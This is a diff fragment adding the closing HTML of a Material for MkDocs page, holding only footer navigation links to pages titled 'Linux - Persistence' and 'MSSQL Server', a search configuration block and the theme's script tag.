+      </main>
+      
+        <footer class="md-footer">
+  
+    
+    <nav class="md-footer__inner md-grid" aria-label="Footer" >
+      
+        
+        <a href="../Linux%20-%20Persistence/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Linux - Persistence" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              Linux - Persistence
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../MSSQL%20Server%20-%20Cheatsheet/" class="md-footer__link md-footer__link--next" aria-label="Next: MSSQL Server" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              MSSQL Server
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.top", "navigation.tracking"], "search": "../../assets/javascripts/workers/search.ecf98df9.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.2ab50757.min.js"></script>
+      
+    
+  </body>
+</html>
